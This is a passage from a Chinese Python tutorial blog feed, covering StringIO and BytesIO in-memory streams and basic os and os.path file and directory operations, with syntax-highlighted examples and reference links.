color="#FF7F00"><strong>f.seekable()：</strong></font>指针是否可操作。</li></ul></blockquote><p>要把str写入StringIO，我们需要先创建一个StringIO，然后，像文件一样写入即可：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> io <span class="token keyword">import</span> StringIO<span class="token comment" spellcheck="true">#内存中构建</span>f <span class="token operator">=</span> StringIO<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#像文件对象一样操作  这里一定要赋值给一个变量!</span><span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>readable<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>writable<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>seekable<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"Hello\nPython"</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#无视指针，输出全部内容</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>OUTPUT：<span class="token boolean">True</span> <span class="token boolean">True</span> <span class="token boolean">True</span>HelloHelloPython<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h4 id="2-2-BytesIO"><font color="#3CB371" face="Comic sans MS">2.2 BytesIO</font><a href="post/Python-FileContents#2-2-BytesIO"></a></h4><p>StringIO操作的只能是str，如果要操作<font color="#FF7F00"><strong>二进制数据</strong></font>，就需要使用BytesIO。</p><p>BytesIO是IO模块中的类，所以使用的时候要引用模块：<code>from io import BytesIO</code></p><ul><li><p>内存中，开辟的一个二进制模式的buffer，可以像文件对象一样操作它；</p></li><li><p>当使用close()前写入的数据是<font color="#FF7F00"><strong>使用追加模式</strong></font>；</p></li><li><p>当close方法被调用的时候，这个buffer会被释放；</p></li><li><p>使用到的方法和StringIO一样，不过一个读的是字符一个读的是字节。</p></li></ul><br><p>BytesIO实现了在内存中读写bytes，我们创建一个BytesIO，然后写入一些bytes：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIOff <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>ff<span class="token punctuation">.</span>readable<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ff<span class="token punctuation">.</span>writable<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ff<span class="token punctuation">.</span>seekable<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>ff<span class="token punctuation">.</span>write<span class="token punctuation">(</span>b<span class="token string">'Hello\nPython'</span><span class="token punctuation">)</span>ff<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'中文'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>ff<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>ff<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>ff<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>ff<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>OUTPUT：<span class="token boolean">True</span> <span class="token boolean">True</span> <span class="token boolean">True</span>b<span class="token string">'Hello\n'</span>b<span class="token string">'Hello\nPython\xe4\xb8\xad\xe6\x96\x87'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><strong>file-like对象</strong></p><p>类文件对象，可以像文件对象一样操作；</p><p>socket对象，输入输出对象(stdin、stdout)都是类文件对象</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> sys <span class="token keyword">import</span> stdoutf <span class="token operator">=</span> stdout<span class="token keyword">print</span><span class="token punctuation">(</span>type<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"90data.net"</span><span class="token punctuation">)</span>OUTPUT：<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_io.TextIOWrapper'</span><span class="token operator">></span>90data<span class="token punctuation">.</span>net<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h3 id="三-操作目录"><font color="#FF6347" face="Comic sans MS">三. 操作目录</font><a href="post/Python-FileContents#三-操作目录"></a></h3><p>如果我们要操作文件、目录，可以在命令行下面输入操作系统提供的各种命令来完成。比如dir、cp等命令。</p><p>如果要在Python程序中执行这些目录和文件的操作怎么办？其实操作系统提供的命令只是简单地调用了操作系统提供的接口函数，Python内置的<font color="#FF7F00"><strong>os模块</strong></font>也可以直接<font color="#FF7F00"><strong>调用操作系统提供的接口函数</strong></font>。</p><p><font face="Comic sans MS"><font color="#00B2EE">具体方法：[<a href="http://www.runoob.com/python3/python3-os-file-methods.html" target="_blank" rel="noopener">Python3 OS 文件/目录方法</a>]</font><br></font></p><p>打开Python交互式命令行，我们来看看如何使用os模块的基本功能：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>name<span class="token punctuation">)</span>    <span class="token triple-quoted-string string">'''如果是posix，说明系统是Linux、Unix或Mac OS X，                   如果是nt，就是Windows系统。'''</span>os<span class="token punctuation">.</span>uname<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token triple-quoted-string string">'''注意uname()函数在Windows上不提供，也就是说，                     os模块的某些函数是跟操作系统相关的。'''</span>os<span class="token punctuation">.</span>environ        <span class="token triple-quoted-string string">'''在操作系统中定义的环境变量，全部保存在os.environ                     这个变量中'''</span>os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">)</span>  <span class="token triple-quoted-string string">'''要获取某个环境变量的值，可以调用os.environ.get('key')，                        如os.environ.get('PATH')'''</span><span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token triple-quoted-string string">'''查看当前目录的绝对路径:'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><strong>操作文件和目录</strong></p><p>操作文件和目录的函数一部分放在os模块中，一部分放在os.path模块中，这一点要注意一下。查看、创建和删除目录可以这么调用：</p><pre class="line-numbers language-python"><code class="language-python">查看当前目录的绝对路径<span class="token punctuation">:</span><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token string">'/Users/michael'</span>在某个目录下创建一个新目录，首先把新目录的完整路径表示出来<span class="token punctuation">:</span><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'/Users/michael'</span><span class="token punctuation">,</span> <span class="token string">'testdir'</span><span class="token punctuation">)</span><span class="token string">'/Users/michael/testdir'</span>然后创建一个目录<span class="token punctuation">:</span><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'/Users/michael/testdir'</span><span class="token punctuation">)</span>删掉一个目录<span class="token punctuation">:</span><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>rmdir<span class="token punctuation">(</span><span class="token string">'/Users/michael/testdir'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>把两个路径合成一个时，不要直接拼字符串，而要通过os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>函数，这样可以正确处理不同操作系统的路径分隔符。在Linux<span class="token operator">/</span>Unix<span class="token operator">/</span>Mac下，os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>返回这样的字符串：part<span class="token number">-1</span><span class="token operator">/</span>part<span class="token number">-2</span>而Windows下会返回这样的字符串：part<span class="token number">-1</span>\part<span class="token number">-2</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>同样的道理，要拆分路径时，也不要直接去拆字符串，而要通过os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>函数，这样可以把一个路径拆分为两部分，后一部分总是最后级别的目录或文件名：<span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/Users/michael/testdir/file.txt'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'/Users/michael/testdir'</span><span class="token punctuation">,</span> <span class="token string">'file.txt'</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>splitext<span class="token punctuation">(</span><span class="token punctuation">)</span>可以直接让你得到文件扩展名，很多时候非常方便：<span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>splitext<span class="token punctuation">(</span><span class="token string">'/path/to/file.txt'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'/path/to/file'</span><span class="token punctuation">,</span> <span class="token string">'.txt'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>同样的道理，要拆分路径时，也不要直接去拆字符串，而要通过os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>函数，这样可以把一个路径拆分为两部分，后一部分总是最后级别的目录或文件名：<span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/Users/michael/testdir/file.txt'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'/Users/michael/testdir'</span><span class="token punctuation">,</span> <span class="token string">'file.txt'</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>splitext<span class="token punctuation">(</span><span class="token punctuation">)</span>可以直接让你得到文件扩展名，很多时候非常方便：<span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>splitext<span class="token punctuation">(</span><span class="token string">'/path/to/file.txt'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'/path/to/file'</span><span class="token punctuation">,</span> <span class="token string">'.txt'</span><span class="token punctuation">)</span>这些合并、拆分路径的函数并不要求目录和文件要真实存在，它们只对字符串进行操作。<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>文件操作使用下面的函数。假定当前目录下有一个test<span class="token punctuation">.</span>txt文件： 对文件重命名<span class="token punctuation">:</span><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>rename<span class="token punctuation">(</span><span class="token string">'test.txt'</span><span class="token punctuation">,</span> <span class="token string">'test.py'</span><span class="token punctuation">)</span> 删掉文件<span class="token punctuation">:</span><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">'test.py'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>但是复制文件的函数居然在os模块中不存在！原因是复制文件并非由操作系统提供的系统调用。理论上讲，我们通过上一节的读写文件可以完成文件复制，只不过要多写很多代码。幸运的是shutil模块提供了copyfile<span class="token punctuation">(</span><span class="token punctuation">)</span>的函数，你还可以在shutil模块中找到很多实用函数，它们可以看做是os模块的补充。<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>最后看看如何利用Python的特性来过滤文件。比如我们要列出当前目录下的所有目录，只需要一行代码：<span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'.lein'</span><span class="token punctuation">,</span> <span class="token string">'.local'</span><span class="token punctuation">,</span> <span class="token string">'.m2'</span><span class="token punctuation">,</span> <span class="token string">'.npm'</span><span class="token punctuation">,</span> <span class="token string">'.ssh'</span><span class="token punctuation">,</span> <span class="token string">'.Trash'</span><span class="token punctuation">,</span> <span class="token string">'.vim'</span><span class="token punctuation">,</span> <span class="token string">'Applications'</span><span class="token punctuation">,</span> <span class="token string">'Desktop'</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>要列出所有的<span class="token punctuation">.</span>py文件，也只需一行代码：<span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">and</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>splitext<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'.py'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'apis.py'</span><span class="token punctuation">,</span> <span class="token string">'config.py'</span><span class="token punctuation">,</span> <span class="token string">'models.py'</span><span class="token punctuation">,</span> <span class="token string">'pymonitor.py'</span><span class="token punctuation">,</span> <span class="token string">'test_db.py'</span><span class="token punctuation">,</span> <span class="token string">'urls.py'</span><span class="token punctuation">,</span> <span class="token string">'wsgiapp.py'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h3 id="四-序列化"><font color="#FF6347" face="Comic sans MS">四. 序列化</font><a href="post/Python-FileContents#四-序列化"></a></h3><p>参读资料：<br><font face="Comic sans MS"><font color="#00B2EE">《<a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/00143192607210600a668b5112e4a979dd20e4661cc9c97000" target="_blank" rel="noopener">廖雪峰的官方网站 序列化</a>》</font><br></font><br><font face="Comic sans MS"><font color="#00B2EE">《<a href="https://www.cnblogs.com/yyds/p/6563608.html" target="_blank" rel="noopener">Python之数据序列化（json、pickle、shelve）</a>》</font><br></font><br><font face="Comic sans MS"><font color="#00B2EE">《<a href="https://www.cnblogs.com/zhangxinqi/p/8034380.html" target="_blank" rel="noopener">python3之序列化（pickle&amp;json&amp;shelve）</a>》</font><br></font></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-函数式编程</title>
      <link href="/post/Python-FunctionalProgramming/"/>
      <url>/post/Python-FunctionalProgramming/</url>
      
